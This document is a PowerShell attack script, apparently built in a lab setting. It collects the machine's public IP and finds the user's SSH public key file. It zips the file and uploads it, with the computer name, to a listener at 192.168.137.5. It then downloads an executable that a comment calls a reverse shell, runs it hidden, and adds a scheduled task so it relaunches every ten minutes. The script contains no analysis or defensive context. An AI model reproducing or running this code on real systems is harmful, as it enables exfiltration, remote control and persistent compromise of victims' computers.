& {
    $logFile = "$env:TEMP\payload_log.txt"
    Add-Content $logFile "=== Script started at $(Get-Date) ==="

    # Load required assembly for compression
    Add-Type -AssemblyName System.IO.Compression.FileSystem

    # Get public IP (optional)
    try {
        $p = (Invoke-WebRequest https://api.ipify.org -UseBasicParsing -TimeoutSec 5 | Select -Exp Content)
        Add-Content $logFile "Public IP: $p"
    } catch {
        $p = "unknown"
        Add-Content $logFile "Failed to get public IP: $_"
    }

    # Find id_*.pub file
    Add-Content $logFile "Searching for id_*.pub in $env:USERPROFILE"
    $f = Get-ChildItem $env:USERPROFILE -Recurse -Include '*.pub' -File -Force -ErrorAction SilentlyContinue |
         Where-Object { $_.Name -like 'id_*.pub' } | Select -First 1

    if ($f) {
        Add-Content $logFile "Found file: $($f.FullName)"
        # Read file bytes
        $originalBytes = [System.IO.File]::ReadAllBytes($f.FullName)
        Add-Content $logFile "Original bytes: $($originalBytes.Length)"
        # Compute SHA256 of original file
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $hash = $sha256.ComputeHash($originalBytes)
        $hashString = [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
        Add-Content $logFile "Original SHA256: $hashString"

        # Create in-memory zip archive
        $zipStream = New-Object System.IO.MemoryStream
        $zipArchive = [System.IO.Compression.ZipArchive]::new($zipStream, [System.IO.Compression.ZipArchiveMode]::Create, $true)
        # Add entry with the file name (just the name, no path)
        $entry = $zipArchive.CreateEntry($f.Name)
        # Write file content into the entry
        $entryStream = $entry.Open()
        $entryStream.Write($originalBytes, 0, $originalBytes.Length)
        $entryStream.Close()
        $zipArchive.Dispose()
        # Get zip bytes
        $zipBytes = $zipStream.ToArray()
        $zipStream.Close()
        Add-Content $logFile "Zip bytes: $($zipBytes.Length)"
    } else {
        Add-Content $logFile "No file found. Sending 'Not found'"
        $zipBytes = [System.Text.Encoding]::UTF8.GetBytes('Not found')
        $hashString = "none"
    }

    # Build the URI with the computer name
    $u = "http://192.168.137.5:8080/$env:COMPUTERNAME"

    # Create WebClient
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('X-Message', 'Jeeva Halal')
    $wc.Headers.Add('X-Public-IP', $p)
    $wc.Headers.Add('X-File-Hash', $hashString)   # hash of original file (for verification)
    $wc.Headers.Add('Content-Type', 'application/octet-stream')

    # Upload zip bytes
    try {
        $response = $wc.UploadData($u, 'POST', $zipBytes)
        Add-Content $logFile "UploadData succeeded. Response: $([System.Text.Encoding]::UTF8.GetString($response))"
    } catch {
        Add-Content $logFile "UploadData failed: $_"
    }

    # Download and run reverse shell
    $wc.DownloadFile('http://192.168.137.5:5000/download/update.exe', "$env:TEMP\update.exe")
    Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden

    # Create persistence
    $rn = [guid]::NewGuid().ToString().Substring(0,8)
    schtasks /create /tn $rn /tr "$env:TEMP\update.exe" /sc minute /mo 10 /f

    Add-Content $logFile "=== Script finished ==="
}